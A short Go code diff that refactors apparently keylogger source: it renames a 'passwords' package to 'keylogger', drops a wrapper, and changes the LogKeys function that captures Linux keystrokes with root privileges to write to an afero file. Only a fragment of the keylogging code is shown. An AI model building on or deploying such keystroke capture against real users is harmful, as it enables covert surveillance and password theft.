@@ -1,9 +1,10 @@
-package passwords
+package keylogger
 
 import (
 	"bytes"
 	"encoding/binary"
 	"fmt"
+	"github.com/spf13/afero"
 	"log"
 	"os"
 	"os/exec"
@@ -215,14 +216,10 @@ const (
 	EvRepeat = 2
 )
 
-func LinuxKeyLogger() {
-	LogKeys(os.Stdout) // TODO Modify
-}
-
 // LogKeys is the all-encapsulated function for logging keystrokes in Linux
 // with root privileges.
 // 			Example usage: .
-func LogKeys(out *os.File) {
+func LogKeys(out afero.File) {
 	// our communication channels for the input event goroutine
 	events := make(chan inputEvent, 1)
 	done := make(chan struct{})
